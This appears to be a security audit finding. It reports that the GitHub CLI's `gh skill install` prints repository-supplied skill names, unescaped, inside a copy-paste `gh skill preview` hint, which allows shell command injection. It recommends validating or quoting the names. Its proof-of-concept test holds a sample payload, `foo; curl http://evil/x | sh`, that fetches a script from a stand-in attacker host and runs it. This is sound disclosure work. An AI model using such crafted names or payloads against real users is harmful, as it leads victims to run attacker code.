### Title
Unsanitized attacker-controlled skill names embedded in `gh skill preview` copy-paste hint enable shell metacharacter injection - ([File: pkg/cmd/skills/install/install.go])

### Finding Description
`printReviewHint` (pkg/cmd/skills/install/install.go:1198-1221) builds a suggested `gh skill preview <repo> <name>@<sha>` command line for each installed skill and writes it verbatim with `fmt.Fprintf(w, "    gh skill preview %s %s@%s%s\n", repo, name, sha, hiddenFlag)` using the raw `name` value taken from `skillNames`/`result.Installed`. These names originate from repository directory names discovered by `discoverSkills` (pkg/cmd/skills/install/install.go:634-658), which come directly from attacker-controlled repository tree entries (`discovery.DiscoverSkillsWithOptions`). The only validation applied is `discovery.IsSpecCompliant(s.Name)` at line 653, and a violation only produces a warning (`Warning: skill %q does not follow the agentskills.io naming convention`) — it does not block installation or sanitize the name. Consequently, a skill directory whose name contains shell metacharacters (e.g. `;`, `|`, backticks, `$( )`) or embedded newlines/ANSI escapes can flow unmodified from `installRun` → `buildInstallPlans`/`installer.Install` (`result.Installed`) → `printReviewHint` → the printed hint text on `opts.IO.ErrOut`. No quoting, shell-escaping, or character allowlist is applied before the name is interpolated into the suggested command line.

### Impact Explanation
If a victim copies the printed `gh skill preview owner/repo <name>@<sha>` hint line into a shell (a normal workflow encouraged by the hint itself), embedded shell metacharacters in `<name>` can cause the shell to execute attacker-chosen commands instead of, or in addition to, the intended `gh skill preview` invocation. This matches the "victim-initiated command execution via copy-paste of a spoofed hint" impact class — a terminal/output-injection leading to command execution on the victim's machine, contingent on the victim pasting the text into a shell.

### Likelihood Explanation
Preconditions are straightforward and within the unprivileged attacker's capability: publish a public repository containing a `skills/<attacker-name>/SKILL.md` directory where `<attacker-name>` contains shell metacharacters (permitted by git/filesystem naming rules; only cosmetically flagged by `IsSpecCompliant`, not rejected). Any victim running `gh skill install owner/repo` (or `--all`) against that repository will have the malicious name echoed into the hint. Exploitation still requires the victim to manually copy and execute the printed line in a shell, which lowers but does not eliminate real-world feasibility — it is reproducible every time the crafted repo is installed.

### Recommendation
Sanitize or reject skill/directory names before they are used in any copy-paste command hint: either enforce the agentskills.io naming convention as a hard install-time validation (reject non-compliant names outright rather than warn-only), or shell-quote (`strconv.Quote`/POSIX single-quote wrapping) and strip control/ANSI characters from `name` when constructing the `gh skill preview` hint string in `printReviewHint`.

### Proof of Concept
Extend `Test_printReviewHint` in pkg/cmd/skills/install/install_test.go with a case where `skillNames` contains a value such as `foo; curl http://evil/x | sh` (or one containing a newline/backtick), call `printReviewHint(buf, cs, "owner/repo", "deadbeef", []string{"foo; curl http://evil/x | sh"}, false)`, and assert the emitted line either quotes the name (e.g. wrapped in single quotes with escaping) or that install-time validation causes such a name to be rejected before reaching `printReviewHint`. Currently the raw metacharacters would appear unescaped in the output, which the test should assert against (expected failure demonstrating the issue) as: `require.NotContains(t, buf.String(), "curl http://evil/x | sh\n")` failing, or equivalently checking the printed line is shell-safe via `shellwords`/quoting round-trip.
